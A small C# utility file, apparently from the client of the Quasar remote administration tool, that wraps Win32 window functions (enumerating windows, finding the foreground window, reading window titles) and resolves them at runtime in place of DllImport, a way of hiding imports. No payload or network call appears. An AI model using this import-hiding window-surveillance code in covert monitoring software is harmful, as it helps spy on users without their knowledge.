using Quasar.Client.Win32PE.PE;
using Quasar.Client.Win32PE.Structs;
using Quasar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    public static partial class ClientNatives
    {
        //[DllImport("user32.dll")]
        internal delegate bool EnumDesktopWindowsFunc(IntPtr hDesktop, EnumDesktopWindowsProc callback, IntPtr lParam);
        internal static bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsProc callback, IntPtr lParam) => Lookup<EnumDesktopWindowsFunc>("user32.dll", "EnumDesktopWindows")(hDesktop, callback
            , lParam);

        //[DllImport("user32.dll")]
        internal delegate bool IsWindowVisibleFunc(IntPtr hWnd);
        internal static bool IsWindowVisible(IntPtr hWnd) => Lookup<IsWindowVisibleFunc>("user32.dll", "IsWindowVisible")(hWnd);

        //[DllImport("user32.dll")]
        internal delegate IntPtr GetForegroundWindowFunc();
        internal static IntPtr GetForegroundWindow() => Lookup<GetForegroundWindowFunc>("user32.dll", "GetForegroundWindow")();

        //[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate int GetWindowTextFunc(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount);
        internal static int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount) => Lookup<GetWindowTextFunc>("user32.dll", "GetWindowTextW")(hWnd, lpString, nMaxCount);

        // structs
        internal delegate bool EnumDesktopWindowsProc(IntPtr hDesktop, IntPtr lParam);
    }
}
